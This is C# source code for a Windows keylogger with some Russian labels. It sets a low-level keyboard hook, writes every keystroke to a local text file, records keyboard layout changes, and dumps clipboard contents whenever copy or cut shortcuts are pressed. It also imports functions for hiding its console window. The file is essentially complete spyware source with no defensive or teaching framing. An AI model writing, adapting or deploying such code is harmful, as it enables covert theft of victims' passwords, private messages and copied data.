using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ConsoleApplication1
{
    public static   class  Logger
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;

        private const int VK_SHIFT = 0x10;	
        private const int VK_CONTROL = 0x11;	
        private const int VK_MENU = 0x12; 
        private const int VK_CAPITAL = 0x14; 

        public static LowLevelKeyboardProc _proc = HookCallback;
       public static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static int myi = 0;
        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        public  delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                KeysConverter kc = new KeysConverter();
                string mystring = kc.ConvertToString((Keys)vkCode);

                string original = mystring;
      

               


                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();

                if (mss == mss_check) { }
                else
                {
                    Writer("\n<changed Keyboard Layout:" + mss_check + " >\n");

                
                    mss = mss_check;
                }

                if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                {
                    Writer(original);

                }

                if (wParam == (IntPtr)WM_KEYUP) 
                {
                    if (Keys.LControlKey == (Keys)vkCode) { Writer(original); } 
                    if (Keys.LShiftKey == (Keys)vkCode) { Writer(original); } 
                }

                if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+X: {0}", (Keys)vkCode);

                    string htmlData1 = GetBuff();                                                  
                    Writer("clipboard: " + htmlData1 + "\n");                  


                    Writer("\n<COPY>\n");

                }
                
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    Console.WriteLine("CTRL+C: {0}", (Keys)vkCode);

                    string htmlData1 = GetBuff();                                                  
                    Writer("clipboard: " + htmlData1 + "\n");                  
                  

                     Writer("\n<COPY>\n");
             
                }


                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                   
                    Writer("\n<PASTE>\n");
                 

                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                  
                    Writer("\n<Отмена>\n");
           
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

              
                    Writer("\n<Искать>\n");
            
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                  
                     Writer("\n<Выделить всё>\n");
                
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                  
                      Writer("\n<Новый>\n");

                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                  
                    Writer("\n<Нов.вкладка>\n");
    

                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                  
                    Writer("\n<Вырезать>\n");
        
                }

             

            }


            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }

      



       

        public static void Writer(string plainText)
        {
         
            using (StreamWriter w = File.AppendText("myFile.txt"))
            {
              
                if(plainText.Length>1)
                {
                
                    w.WriteLine("\n{0}", plainText);
                }
                else
                {
              
                    w.Write(plainText);
                }
               
            }
      
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
       public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
       public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

       public const int SW_HIDE = 0;

        

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );


       public static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
    }
}
